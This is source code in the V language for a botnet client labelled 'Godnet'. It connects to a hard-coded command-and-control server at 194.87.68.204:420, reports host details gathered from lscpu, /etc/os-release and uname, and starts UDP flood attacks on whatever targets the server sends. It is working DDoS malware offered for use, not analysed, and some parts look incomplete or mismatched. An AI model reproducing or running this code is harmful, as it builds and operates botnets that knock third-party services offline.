import io
import os
import net
import rand

import methods

pub const (
	backend_ip 		= "194.87.68.204"
	backend_port 	= 420
	secret_key 		= ""
)

pub struct DeviceInfo 
{
	// os, arch, cpu, ram etc
	pub mut:
		os		string
		cpu		string
		arch	string
		cores 	string
		ram 	string
		uname 	string
}

fn main() 
{
	mut net_socket := net.dial_tcp("${backend_ip}:${backend_port}") or {
		println("[ X ] Error, Unable to start server....")
		return
	}

	mut reader := io.new_buffered_reader(reader: net_socket)

	/*
		secret_key
		device_info
	*/
	mut device_info := get_device_info()
	net_socket.write_string("${secret_key}\n") or { 0 }
	net_socket.write_string("${device_info.to_str()}\n") or { 0 }

	/* Listen To The Godnet CNC Server For New Attacks */
	for {
		data := reader.read_line() or { "" }
		args := data.split(" ")
		cmd := args[0]

		if data.len < 3 { continue }
		
		match cmd 
		{
			"attack" {
				println("CAUGHT A NEW ATTACKSKIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII")
				go methods.udp_flood(args[1], args[2], args[3])
				net_socket.write_string("ATTACK SENT") or { 0 }
			} else {}
		}
	}
}

pub fn get_device_info() DeviceInfo
{

	/* Get CPU Info */
	lscpu := os.execute("lscpu").output.split("\n")

	mut cpu_cores := ""
	mut cpu_name := ""

	for line in lscpu 
	{
		if line.starts_with("CPU(s):")
		{ cpu_cores = line.replace("CPU(s):", "").trim_space() }
		else if line.starts_with("Model name:")
		{ cpu_name = line.replace("Model name:", "").trim_space() }
	}

	os_release := os.execute("cat /etc/os-release").output.split("\n")
	mut os_name := ""
	for line in os_release
	{ if line.starts_with("NAME=\"") { os_name = line.replace("NAME=\"", "").trim_space() } }

	return DeviceInfo{ 	
		os: os_name
		cpu: cpu_name, 
		arch: lscpu[0].replace("Architecture:", "").trim_space(), 
		cores: cpu_cores,
		uname: os.execute("uname -a").output 
	}
}

pub fn (mut d DeviceInfo) to_str() map[string]string
{
	return { "os": d.os,
			 "cpu": d.cpu,
			 "arch": d.arch,
			 "cores": d.cores,
			 "uname": d.uname }
}

/*
	Knowing linux cant handle special keys, this UDP 
	will most likely crash anything not handling UDP correctly
*/
pub fn udp(host string, p string, t string)
{
	mut c := net.dial_udp("${host}:${p}") or { return }
    c.write_string(randomize_hex(255)) or { 0 }
    c.close() or { return }
}

fn randomize_hex(hex_sz int) string
{
    mut new_hex := ""
    chars := "qwertyuiopasdfghjklzxcvbnm1234567890-=`[]\\;',./<>?L●☻☺♠♣♥♦♪◘№℅Ω™℮℗₸₷₵₳₴₱₲₿₥₤₣:\"{}|_+~╓╔®╕╖╗©╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬▀▄█▌▐░▒▓►▼◄▲".split("")
    for _ in 0..hex_sz
    {
        num := rand.int_in_range(0, chars.len) or { 0 }
        new_hex += chars[num]
    }
    return new_hex
}